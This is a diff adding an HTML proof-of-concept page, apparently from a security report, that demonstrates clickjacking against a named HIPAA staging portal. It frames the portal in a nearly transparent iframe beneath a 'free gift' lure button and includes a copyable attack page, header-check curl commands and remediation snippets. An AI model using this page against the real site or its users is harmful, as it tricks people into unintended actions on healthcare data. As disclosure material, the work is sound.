@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Proof of Concept: Clickjacking on HIPAA Portal</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .demo-area {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .malicious-site, .hidden-frame {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            border: 2px solid #e0e0e0;
+        }
+        
+        .malicious-site {
+            border-color: #ff6b6b;
+        }
+        
+        .hidden-frame {
+            border-color: #4ecdc4;
+            position: relative;
+        }
+        
+        .frame-container {
+            border: 2px dashed #ccc;
+            height: 400px;
+            margin-top: 15px;
+            position: relative;
+            overflow: hidden;
+            border-radius: 5px;
+        }
+        
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0.1;
+        }
+        
+        .fake-button {
+            position: absolute;
+            top: 150px;
+            left: 150px;
+            background: #00b894;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            z-index: 1000;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            transition: transform 0.2s;
+        }
+        
+        .fake-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0,0,0,0.15);
+        }
+        
+        .overlay-text {
+            position: absolute;
+            top: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255, 107, 107, 0.9);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-weight: bold;
+            z-index: 1001;
+        }
+        
+        .controls {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        
+        .slider-container {
+            margin: 15px 0;
+        }
+        
+        input[type="range"] {
+            width: 100%;
+            margin: 10px 0;
+        }
+        
+        .code-block {
+            background: #2d3436;
+            color: #dfe6e9;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+        }
+        
+        .vulnerable { color: #ff6b6b; font-weight: bold; }
+        .protected { color: #00b894; font-weight: bold; }
+        
+        button {
+            background: #6c5ce7;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+            font-size: 14px;
+        }
+        
+        button:hover {
+            background: #5b4fcf;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🖼️ Clickjacking Proof of Concept</h1>
+            <p>Target: <span class="vulnerable">https://hipaa.staging.gearset.com</span></p>
+            <p>Vulnerability: Missing X-Frame-Options Header</p>
+        </div>
+        
+        <div class="demo-area">
+            <div class="malicious-site">
+                <h2>💀 Malicious Website (Attacker Controlled)</h2>
+                <p>This appears to be a legitimate website with a harmless button...</p>
+                
+                <div class="frame-container" id="frameContainer">
+                    <div class="overlay-text">Invisible HIPAA Portal Frame Loaded Below</div>
+                    <button class="fake-button" onclick="simulateClickjack()">
+                        🎁 Claim Your Free Gift!
+                    </button>
+                    <iframe src="https://hipaa.staging.gearset.com" id="targetFrame"></iframe>
+                </div>
+                
+                <p style="margin-top: 15px; font-size: 14px; color: #666;">
+                    <strong>What the user sees:</strong> A button to claim a free gift<br>
+                    <strong>What actually happens:</strong> User interacts with the invisible HIPAA portal
+                </p>
+            </div>
+            
+            <div class="hidden-frame">
+                <h2>🔍 Technical Details</h2>
+                <p><span class="vulnerable">VULNERABLE:</span> Application can be framed due to missing headers:</p>
+                
+                <div class="code-block">
+$ curl -I "https://hipaa.staging.gearset.com" | grep -i "x-frame-options"
+<em># No output - header is missing</em>
+
+$ curl -I "https://hipaa.staging.gearset.com" | grep -E "(x-frame-options|frame-ancestors)"
+<em># Neither X-Frame-Options nor CSP frame-ancestors are present</em>
+                </div>
+                
+                <h3>Attack Scenario:</h3>
+                <ol style="margin-left: 20px; margin-top: 10px;">
+                    <li>Attacker creates malicious page with invisible iframe</li>
+                    <li>HIPAA portal loads inside iframe (opacity: 0.1)</li>
+                    <li>Attacker overlays fake button over sensitive areas</li>
+                    <li>User clicks fake button, actually interacts with HIPAA portal</li>
+                    <li>Attacker captures sensitive actions (deletes data, changes settings)</li>
+                </ol>
+                
+                <h3>Real-World Impact:</h3>
+                <ul style="margin-left: 20px; margin-top: 10px;">
+                    <li>Unauthorized data deletion/modification</li>
+                    <li>Account takeover if "Delete Account" button is targeted</li>
+                    <li>Configuration changes in healthcare settings</li>
+                    <li>Violation of HIPAA data integrity requirements</li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="controls">
+            <h3>🎮 Demonstration Controls</h3>
+            
+            <div class="slider-container">
+                <label>Iframe Opacity: <span id="opacityValue">0.1</span></label>
+                <input type="range" min="0" max="100" value="10" id="opacitySlider" 
+                       oninput="updateOpacity(this.value)">
+            </div>
+            
+            <div class="slider-container">
+                <label>Fake Button Position - X: <span id="posX">150</span>px</label>
+                <input type="range" min="0" max="300" value="150" id="posXSlider" 
+                       oninput="updatePosition('x', this.value)">
+            </div>
+            
+            <div class="slider-container">
+                <label>Fake Button Position - Y: <span id="posY">150</span>px</label>
+                <input type="range" min="0" max="300" value="150" id="posYSlider" 
+                       oninput="updatePosition('y', this.value)">
+            </div>
+            
+            <div>
+                <button onclick="showAttackCode()">Show Attack Code</button>
+                <button onclick="showRemediation()">Show Remediation</button>
+                <button onclick="resetDemo()">Reset Demo</button>
+            </div>
+        </div>
+        
+        <div id="codeDisplay" style="display: none; margin-top: 20px;"></div>
+    </div>
+
+    <script>
+        function simulateClickjack() {
+            alert('⚠️ ATTACK SUCCESSFUL!\n\nUser thought they clicked "Claim Free Gift", but actually interacted with the HIPAA portal.\n\nPotential actions performed:\n• Delete patient records\n• Change account settings\n• Export sensitive data\n• Modify user permissions');
+        }
+        
+        function updateOpacity(value) {
+            const frame = document.getElementById('targetFrame');
+            const opacity = value / 100;
+            frame.style.opacity = opacity;
+            document.getElementById('opacityValue').textContent = opacity.toFixed(1);
+        }
+        
+        function updatePosition(axis, value) {
+            const button = document.querySelector('.fake-button');
+            if (axis === 'x') {
+                button.style.left = value + 'px';
+                document.getElementById('posX').textContent = value;
+            } else {
+                button.style.top = value + 'px';
+                document.getElementById('posY').textContent = value;
+            }
+        }
+        
+        function showAttackCode() {
+            const codeDisplay = document.getElementById('codeDisplay');
+            codeDisplay.style.display = 'block';
+            codeDisplay.innerHTML = `
+                <div class="code-block">
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Legitimate Looking Site&lt;/title&gt;
+    &lt;style&gt;
+        #hidden-frame {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 500px;
+            opacity: 0.1;
+            z-index: 1;
+        }
+        #fake-button {
+            position: absolute;
+            top: 150px;
+            left: 150px;
+            padding: 20px;
+            background: blue;
+            color: white;
+            z-index: 1000;
+            cursor: pointer;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to Our Site!&lt;/h1&gt;
+    &lt;button id="fake-button"&gt;Click for Special Offer&lt;/button&gt;
+    &lt;iframe id="hidden-frame" src="https://hipaa.staging.gearset.com"&gt;&lt;/iframe&gt;
+    
+    &lt;script&gt;
+        // The iframe loads the HIPAA portal
+        // The fake button is positioned over sensitive areas
+        document.getElementById('fake-button').onclick = function() {
+            // User thinks they clicked our button
+            // Actually clicked something in the HIPAA portal
+            alert('Attack successful!');
+        };
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+                </div>
+            `;
+        }
+        
+        function showRemediation() {
+            const codeDisplay = document.getElementById('codeDisplay');
+            codeDisplay.style.display = 'block';
+            codeDisplay.innerHTML = `
+                <div style="background: #d4edda; padding: 20px; border-radius: 5px; border: 1px solid #c3e6cb;">
+                    <h3 style="color: #155724; margin-top: 0;">✅ Remediation</h3>
+                    
+                    <p><strong>Solution 1: Add X-Frame-Options Header</strong></p>
+                    <div class="code-block">
+# Apache
+Header always set X-Frame-Options "DENY"
+
+# Nginx
+add_header X-Frame-Options "DENY";
+
+# IIS
+&lt;system.webServer&gt;
+  &lt;httpProtocol&gt;
+    &lt;customHeaders&gt;
+      &lt;add name="X-Frame-Options" value="DENY" /&gt;
+    &lt;/customHeaders&gt;
+  &lt;/httpProtocol&gt;
+&lt;/system.webServer&gt;
+                    </div>
+                    
+                    <p><strong>Solution 2: Use CSP frame-ancestors (Modern approach)</strong></p>
+                    <div class="code-block">
+Content-Security-Policy: frame-ancestors 'none';
+# or
+Content-Security-Policy: frame-ancestors 'self';
+                    </div>
+                    
+                    <p><strong>Solution 3: JavaScript Framebusting (Additional defense)</strong></p>
+                    <div class="code-block">
+&lt;script&gt;
+if (self !== top) {
+    top.location = self.location;
+}
+&lt;/script&gt;
+&lt;noscript&gt;
+    &lt;style&gt;body { display: none !important; }&lt;/style&gt;
+&lt;/noscript&gt;
+                    </div>
+                </div>
+            `;
+        }
+        
+        function resetDemo() {
+            document.getElementById('opacitySlider').value = 10;
+            document.getElementById('posXSlider').value = 150;
+            document.getElementById('posYSlider').value = 150;
+            updateOpacity(10);
+            updatePosition('x', 150);
+            updatePosition('y', 150);
+            document.getElementById('codeDisplay').style.display = 'none';
+        }
+        
+        // Initialize
+        updateOpacity(10);
+    </script>
+</body>
+</html>
